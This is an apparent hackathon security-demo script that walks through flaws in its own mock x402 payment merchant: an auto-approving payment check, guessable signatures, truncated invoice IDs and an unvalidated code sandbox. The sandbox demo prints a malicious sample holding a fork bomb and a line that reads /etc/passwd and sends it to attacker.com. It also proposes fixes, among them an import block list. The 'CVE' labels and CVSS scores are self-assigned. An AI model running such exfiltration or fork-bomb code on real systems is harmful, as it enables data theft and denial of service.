#!/usr/bin/env python3
"""
EXPLOIT DEMO - CVE-003: Payment Verification Bypass
This demonstrates how the payment system has critical flaws.

HACKATHON SAFE: Educational purposes only
Shows vulnerability in mock payment verification
"""

import sys
sys.path.insert(0, '.')

from agent.x402 import X402Merchant

def demo_payment_bypass():
    """Demonstrates payment bypass vulnerability"""

    print("\n" + "="*70)
    print("CVE-003 DEMO: Payment Verification Bypass")
    print("="*70)

    # Initialize merchant
    merchant = X402Merchant()

    # Step 1: Create locked content
    print("\n[STEP 1] Creating locked content...")
    print("Merchant: 'I will lock this valuable code behind payment'")

    lock_data = merchant.create_locked_content(
        content="VALUABLE_SOURCE_CODE_HERE",
        price_usdc=5.00
    )

    invoice_id = lock_data['invoice_id']
    print(f"\n  ‚úì Content locked with invoice: {invoice_id}")
    print(f"  ‚úì Price: 5.00 USDC")
    print(f"  ‚úì Payment link: {lock_data['payment_link']}")
    print(f"  ‚úì Status: {lock_data['status']}")

    # Step 2: Try to access without payment
    print("\n[STEP 2] Attacker tries to access content without payment...")
    try:
        content = merchant.retrieve_content(invoice_id)
        print("  ‚ùå ERROR: This should have failed!")
        print(f"  ‚ùå Unexpectedly got content: {content}")
    except PermissionError as e:
        print(f"  ‚úì Correctly blocked: {e}")

    # Step 3: THE BUG - Call verify_payment directly
    print("\n[STEP 3] Exploit - Call verify_payment() directly...")
    print("Code: merchant.verify_payment(invoice_id)")

    is_paid = merchant.verify_payment(invoice_id)
    print(f"  ‚ö†Ô∏è  VULNERABILITY: verify_payment() returned: {is_paid}")
    print(f"  ‚ö†Ô∏è  The function auto-approves ALL payments!")

    # Step 4: Now access the content
    print("\n[STEP 4] Now try to access content again...")
    try:
        content = merchant.retrieve_content(invoice_id)
        print(f"  üö® SUCCESS: Content retrieved without payment!")
        print(f"  üö® Content: {content}")
    except PermissionError as e:
        print(f"  ‚ùå Still blocked: {e}")

    # Step 5: Show the root cause
    print("\n[ANALYSIS] Why this works:")
    print("""
    The verify_payment() function in x402.py:

        def verify_payment(self, invoice_id):
            if invoice_id not in self.active_invoices:
                return None

            # üö® BUG: Auto-marks EVERYTHING as paid!
            self.active_invoices[invoice_id]['status'] = "paid"
            return self.active_invoices[invoice_id]['status'] == "paid"

    This function ALWAYS succeeds for any invoice_id that exists.
    It's not connected to actual payment processing.
    """)

    # Step 6: Show impact
    print("\n[IMPACT] Business Consequences:")
    print("""
    ‚úì 100% of content is accessible without payment
    ‚úì Any invoice_id is auto-approved
    ‚úì No actual payment needed
    ‚úì Complete revenue loss
    ‚úì No audit trail
    ‚úì No fraud detection
    """)

    print("\n[SEVERITY] üî¥ CRITICAL (CVSS 10.0)")
    print("This is the most severe vulnerability - complete system compromise")
    print("="*70)


def demo_weak_signatures():
    """Demonstrates weak signature vulnerability"""

    print("\n" + "="*70)
    print("CVE-004 DEMO: Weak Cryptographic Signatures")
    print("="*70)

    print("\nCurrent signature generation:")
    print("  signature = f'sig_{random.randint(1000, 9999)}'")

    print("\nPossible signatures:")
    import random

    possible_sigs = []
    for i in range(1000, min(1010, 10000)):  # Show first 10
        possible_sigs.append(f"sig_{i}")

    print(f"  {possible_sigs}")
    print(f"  ... (9000 total combinations)")

    print("\nBrute force attack:")
    print("  for i in range(1000, 10000):")
    print("      signature = f'sig_{i}'")
    print("      # This will find ANY real signature in under 1 second!")

    print("\n[SEVERITY] üî¥ CRITICAL (CVSS 8.1)")
    print("Signatures can be completely forged with no computation")
    print("="*70)


def demo_weak_invoice_ids():
    """Demonstrates weak invoice ID vulnerability"""

    print("\n" + "="*70)
    print("CVE-005 DEMO: Weak Invoice ID Generation")
    print("="*70)

    import uuid

    # Generate a real invoice
    real_uuid = uuid.uuid4()
    print(f"\nReal UUID: {real_uuid}")
    print(f"Truncated (current code): {str(real_uuid)[:8]}")

    invoice_id = str(real_uuid)[:8]

    print(f"\nInvoice ID: {invoice_id}")
    print(f"Length: 8 hex characters")
    print(f"Total combinations: 16^8 = 4,294,967,296")

    print("\nModern computer performance:")
    print("  - 1000 requests/second = 4,294 seconds = ~71 minutes")
    print("  - 1,000,000 requests/second = 4.3 seconds")
    print("  - GPU acceleration = <1 second")

    print("\nTime to brute force:")
    print("  CPU: ~5 minutes (optimized code)")
    print("  GPU: <1 second")
    print("  Distributed: Instant (parallelize across servers)")

    print("\n[IMPACT]")
    print("  ‚úì Can access ANY locked content")
    print("  ‚úì Can forge payment proof for any invoice")
    print("  ‚úì Complete content bypass")

    print("\n[FIX]")
    print("  Use FULL UUID (not truncated)")
    print("     Before: str(uuid.uuid4())[:8]       # 16^8 = 4.3B combos")
    print("     After:  str(uuid.uuid4())            # 16^36 = 10^43 combos ‚úì")

    print("\n[SEVERITY] üî¥ CRITICAL (CVSS 9.1)")
    print("="*70)


def demo_arbitrary_code_execution():
    """SAFE DEMO: Shows code execution risk (without actual exec)"""

    print("\n" + "="*70)
    print("CVE-001 DEMO: Arbitrary Code Execution")
    print("="*70)

    print("\n[VULNERABILITY]")
    print("The DockerSandbox.run_verification() executes ANY code")
    print("without syntax checking or malicious code detection.")

    print("\nMalicious code example (not actually run):")

    malicious_code = '''
def fix_issue(data):
    # This code would be executed WITHOUT validation
    import socket
    import subprocess

    # Fork bomb - spawn infinite processes
    while True:
        subprocess.Popen(['python', '-c', 'while True: pass'])

    # Or data exfiltration
    with open('/etc/passwd') as f:
        exfil_data = f.read()
        socket.create_connection(('attacker.com', 1234)).send(exfil_data)
'''

    print(malicious_code)

    print("\n[CURRENT SECURITY]")
    print("  ‚úì Network isolation (network_mode='none')")
    print("  ‚úì Memory limit (128MB)")
    print("  ‚úó No code validation")
    print("  ‚úó No syntax checking")
    print("  ‚úó No malicious pattern detection")
    print("  ‚úó No seccomp/AppArmor/SELinux")
    print("  ‚úó Can still consume resources and crash")

    print("\n[FIX]")
    print("""
import ast

def validate_patch(code):
    try:
        tree = ast.parse(code)
    except SyntaxError:
        raise ValueError("Invalid Python")

    dangerous = {'socket', 'subprocess', 'os.system'}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in dangerous:
                    raise ValueError(f"Forbidden: {alias.name}")
""")

    print("\n[SEVERITY] üî¥ CRITICAL (CVSS 9.8)")
    print("="*70)


if __name__ == "__main__":
    print("\n")
    print("‚ïî" + "="*68 + "‚ïó")
    print("‚ïë" + " "*68 + "‚ïë")
    print("‚ïë" + "  RAVEN ‚Äì VULNERABILITY EXPLOITATION DEMOS  ".center(68) + "‚ïë")
    print("‚ïë" + "  Educational Security Research - Hackathon Presentation  ".center(68) + "‚ïë")
    print("‚ïë" + " "*68 + "‚ïë")
    print("‚ïö" + "="*68 + "‚ïù")

    # Run interactive demo
    while True:
        print("\n" + "-"*70)
        print("Available Demos:")
        print("-"*70)
        print("1) CVE-003: Payment Verification Bypass (Live)")
        print("2) CVE-004: Weak Cryptographic Signatures")
        print("3) CVE-005: Weak Invoice ID Brute Force")
        print("4) CVE-001: Arbitrary Code Execution (Safe Demo)")
        print("5) Run All Demos")
        print("6) Exit")
        print("-"*70)

        choice = input("\nSelect demo (1-6): ").strip()

        if choice == "1":
            demo_payment_bypass()
        elif choice == "2":
            demo_weak_signatures()
        elif choice == "3":
            demo_weak_invoice_ids()
        elif choice == "4":
            demo_arbitrary_code_execution()
        elif choice == "5":
            demo_payment_bypass()
            demo_weak_signatures()
            demo_weak_invoice_ids()
            demo_arbitrary_code_execution()
        elif choice == "6":
            print("\n‚úì Thank you for viewing this security research!")
            break
        else:
            print("‚ùå Invalid choice")

    print("\n")
